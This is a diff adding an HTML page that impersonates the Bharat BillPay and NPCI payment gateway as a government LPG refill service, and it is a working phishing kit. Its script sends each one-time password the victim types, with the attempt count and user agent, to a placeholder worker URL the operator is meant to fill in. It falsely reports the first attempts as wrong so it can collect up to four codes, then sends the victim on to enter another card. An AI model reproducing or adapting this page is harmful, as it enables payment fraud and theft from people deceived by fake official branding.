@@ -1,0 +1,204 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Bharat BillPay | Government of India Secure Gateway</title>
+    <style>
+        :root { --bbps-navy: #002e5d; --bbps-orange: #f37021; --bg-gray: #f2f5f8; --text-dark: #333; --red: #d32f2f; }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; }
+        
+        body { background: #ced4da; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+
+        /* --- OFFICIAL BBPS LOADER (7 SECONDS) --- */
+        #loader-overlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: #ffffff; z-index: 99999; display: flex; flex-direction: column;
+            justify-content: center; align-items: center;
+        }
+        .official-loader-container { position: relative; width: 110px; height: 110px; display: flex; justify-content: center; align-items: center; }
+        .spinner-ring {
+            position: absolute; width: 100%; height: 100%;
+            border: 4px solid #f3f3f3; border-top: 4px solid var(--bbps-navy);
+            border-bottom: 4px solid var(--bbps-orange); border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+        .loader-logo { width: 50px; z-index: 10; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .loading-text { margin-top: 25px; font-size: 16px; color: var(--bbps-navy); font-weight: 600; letter-spacing: 0.5px; }
+        .secure-lock-msg { margin-top: 8px; font-size: 11px; color: #888; text-transform: uppercase; }
+
+        /* --- MAIN PAGE UI --- */
+        #main-page { display: none; width: 100%; max-width: 450px; background: #fff; min-height: 100vh; box-shadow: 0 0 30px rgba(0,0,0,0.15); border-top: 5px solid var(--bbps-orange); }
+
+        .top-nav { padding: 15px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #eee; }
+        .top-nav img { height: 35px; }
+        
+        .bank-banner { background: var(--bbps-navy); color: #fff; padding: 12px; text-align: center; }
+        .bank-banner h2 { font-size: 14px; font-weight: 500; text-transform: uppercase; }
+
+        .payment-summary { background: #fff9e6; margin: 20px; padding: 15px; border: 1px dashed var(--bbps-orange); border-radius: 6px; }
+        .summary-item { display: flex; justify-content: space-between; font-size: 13px; margin-bottom: 6px; color: #555; }
+        .summary-item b { color: #000; }
+
+        .auth-section { padding: 0 25px 25px; text-align: center; }
+        .auth-section h1 { font-size: 20px; color: var(--bbps-navy); margin-bottom: 10px; }
+        .auth-section p { font-size: 12px; color: #666; margin-bottom: 25px; line-height: 1.6; }
+
+        .otp-input-box {
+            width: 100%; padding: 15px; font-size: 30px; letter-spacing: 12px;
+            text-align: center; border: 1.5px solid #ccc; border-radius: 6px;
+            background: #fdfdfd; outline: none; transition: 0.3s;
+        }
+        .otp-input-box:focus { border-color: var(--bbps-navy); box-shadow: 0 0 8px rgba(0,46,93,0.15); }
+
+        .error-label { color: var(--red); font-size: 12px; font-weight: 600; margin: 12px 0; min-height: 16px; }
+
+        .submit-trigger {
+            width: 100%; padding: 16px; background: var(--bbps-navy); color: #fff;
+            border: none; border-radius: 4px; font-size: 16px; font-weight: 700;
+            cursor: pointer; text-transform: uppercase; letter-spacing: 1px;
+        }
+
+        /* --- TRUSTED FOOTER --- */
+        .trust-footer { background: #f8f9fa; padding: 25px 15px; text-align: center; border-top: 1px solid #eee; margin-top: auto; }
+        .trust-badges { display: flex; justify-content: center; gap: 20px; align-items: center; margin-bottom: 15px; }
+        .trust-badges img { height: 28px; filter: grayscale(1); opacity: 0.6; }
+        .cert-text { font-size: 9px; color: #aaa; text-transform: uppercase; line-height: 1.4; }
+
+        /* Modal Popup */
+        .modal-wrap { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); z-index: 100000; justify-content: center; align-items: center; padding: 20px; }
+        .modal-content { background: #fff; width: 100%; max-width: 340px; border-radius: 12px; padding: 35px 20px; text-align: center; box-shadow: 0 10px 40px rgba(0,0,0,0.5); }
+        .fail-icon { width: 55px; height: 55px; border: 3px solid var(--red); border-radius: 50%; display: flex; justify-content: center; align-items: center; margin: 0 auto 15px; color: var(--red); font-size: 28px; font-weight: bold; }
+    </style>
+</head>
+<body>
+
+    <div id="loader-overlay">
+        <div class="official-loader-container">
+            <div class="spinner-ring"></div>
+            <img src="https://i.ibb.co/SX04FnNd/download.png" class="loader-logo" alt="BBPS">
+        </div>
+        <div class="loading-text">Authenticating Payment Request...</div>
+        <div class="secure-lock-msg">🔒 256-Bit SSL Encrypted Connection</div>
+    </div>
+
+    <div id="main-page">
+        <div class="top-nav">
+            <img src="https://i.ibb.co/SX04FnNd/download.png" alt="BBPS">
+            <img src="https://i.ibb.co/wNTdRvNm/images-5.jpg" alt="NPCI">
+        </div>
+
+        <div class="bank-banner">
+            <h2>Secure Second Factor Authentication</h2>
+        </div>
+
+        <div class="payment-summary">
+            <div class="summary-item"><span>Merchant Name:</span> <b>LPG REFILL GOV SERVICES</b></div>
+            <div class="summary-item"><span>Total Amount:</span> <b style="color: var(--bbps-navy);">₹ 975.50</b></div>
+            <div class="summary-item"><span>Reference ID:</span> <b id="txnId"></b></div>
+            <div class="summary-item"><span>Verification:</span> <b>OTP (SMS)</b></div>
+        </div>
+
+        <div class="auth-section">
+            <h1>Validate OTP</h1>
+            <p>For your security, a one-time password has been sent to your mobile registered with the bank. Enter it below to authorize.</p>
+            
+            <form id="payForm">
+                <input type="tel" id="otpBox" class="otp-input-box" maxlength="6" placeholder="******" required>
+                <div id="statusMsg" class="error-label"></div>
+                <button type="submit" id="mainBtn" class="submit-trigger">Verify & Pay Securely</button>
+            </form>
+
+            <p style="margin-top: 30px; font-size: 11px; color: #999;">
+                Resend code available in: <span id="clock" style="color: var(--red); font-weight: bold;">01:59</span>
+            </p>
+        </div>
+
+        <div class="trust-footer">
+            <div class="trust-badges">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/d/d1/RuPay.svg" alt="RuPay">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" alt="Mastercard">
+                <img src="https://i.ibb.co/6CRmTBw/images.png" alt="Visa">
+            </div>
+            <p class="cert-text">Official Bharat BillPay Portal<br>PCI-DSS Certified | NPCI Monitored | Secure 1.28.0</p>
+        </div>
+    </div>
+
+    <div class="modal-wrap" id="declineModal">
+        <div class="modal-content">
+            <div class="fail-icon">✕</div>
+            <h2 style="font-size: 20px; color: #333; margin-bottom: 10px;">Payment Declined</h2>
+            <p style="font-size: 13px; color: #777; margin-bottom: 25px; line-height: 1.5;">Validation failed due to multiple incorrect OTP entries. Your bank has suspended this session. Please try with another card.</p>
+            <button class="submit-trigger" onclick="window.location.href='pujatwo.html'">Use Different Card</button>
+        </div>
+    </div>
+
+    <script>
+        // --- 7s LOADER ---
+        window.addEventListener('load', () => {
+            setTimeout(() => {
+                document.getElementById('loader-overlay').style.display = 'none';
+                document.getElementById('main-page').style.display = 'block';
+            }, 7000);
+        });
+
+        document.getElementById('txnId').innerText = "REF" + Math.floor(Math.random() * 899999 + 100000);
+
+        // --- WORKER & 4 TRY LOGIC ---
+        let attempts = 0;
+        const workerUrl = "https://your-worker.your-subdomain.workers.dev"; // APNA URL DAAL DENA
+
+        document.getElementById('payForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            attempts++;
+            
+            const otp = document.getElementById('otpBox').value;
+            const btn = document.getElementById('mainBtn');
+            const err = document.getElementById('statusMsg');
+
+            btn.innerText = "Processing Transaction...";
+            btn.disabled = true;
+
+            // Send to Worker
+            fetch(workerUrl, {
+                method: 'POST',
+                mode: 'cors',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ 
+                    type: "OTP_VERIFY", 
+                    value: otp, 
+                    attemptNo: attempts,
+                    meta: window.navigator.userAgent 
+                })
+            })
+            .finally(() => {
+                btn.innerText = "Verify & Pay Securely";
+                btn.disabled = false;
+
+                if(attempts < 4) {
+                    if(attempts === 1) err.innerText = "The OTP you entered is incorrect.";
+                    else if(attempts === 2) err.innerText = "Invalid verification code. (Attempt 2 of 4)";
+                    else if(attempts === 3) err.innerText = "Verification failed. Last attempt remaining.";
+                    document.getElementById('otpBox').value = "";
+                } else {
+                    document.getElementById('declineModal').style.display = 'flex';
+                }
+            });
+        });
+
+        // OTP Countdown
+        let timerTime = 119;
+        setInterval(() => {
+            let m = Math.floor(timerTime / 60), s = timerTime % 60;
+            document.getElementById('clock').innerText = `0${m}:${s < 10 ? '0' + s : s}`;
+            if (timerTime > 0) timerTime--;
+        }, 1000);
+
+        // Numeric Lock
+        document.getElementById('otpBox').addEventListener('input', function() {
+            this.value = this.value.replace(/[^0-9]/g, '');
+        });
+    </script>
+</body>
+</html>
